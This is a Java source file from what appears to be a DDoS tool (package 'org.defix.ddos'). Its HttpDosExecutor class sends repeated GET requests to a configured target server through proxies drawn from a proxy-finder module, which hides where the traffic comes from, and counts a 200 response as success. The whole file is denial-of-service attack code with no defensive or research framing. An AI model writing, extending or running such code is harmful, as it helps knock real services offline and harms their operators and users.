package org.defix.ddos.executor;

import org.defix.ddos.DDosConfiguration;
import org.defix.ddos.executor.abstractions.DosExecutor;
import org.defix.proxyDynamicFinder.objects.ProxyBody;

import java.net.InetSocketAddress;
import java.net.ProxySelector;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class HttpDosExecutor extends DosExecutor {
    private final HttpRequest request = HttpRequest.newBuilder().uri(URI.create(DDosConfiguration
            .TARGET_SERVER)).GET().build();

    public HttpDosExecutor(ProxyBody proxy) {
        super(proxy);
    }

    @Override
    public boolean tryExecute() {
        try {
            HttpClient client = HttpClient.newBuilder()
                    .proxy(ProxySelector.of(new InetSocketAddress(proxy.ip(), proxy.port())))
                    .build();
            return client.send(request, HttpResponse.BodyHandlers.ofString()).statusCode() == 200;
        } catch (Exception e) {
            return false;
        }
    }
}
